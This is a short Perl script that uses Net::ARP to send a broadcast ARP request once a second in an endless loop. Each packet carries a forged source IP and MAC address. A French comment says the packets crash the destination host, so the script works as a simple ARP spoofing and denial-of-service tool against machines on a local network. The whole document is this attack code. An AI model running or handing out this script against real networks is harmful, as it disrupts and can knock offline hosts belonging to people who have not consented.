#!/usr/bin/perl -w
use Net::ARP;
use strict;
$| = 1;
for (;;)
{
	# Etrange... Fais planter l'IP destination !
	Net::ARP::send_packet('wlan0',                 # Device
            '10.8.108.90',          # Source IP
            '0.0.0.0',          # Destination IP
            '94:db:c9:47:dc:6d',  # Source MAC
            'FF:FF:FF:FF:FF:FF',  # Destinaton MAC
            'request');             # ARP operation
	sleep 1;
	print("Packet ARP Envoyé !\n");
}
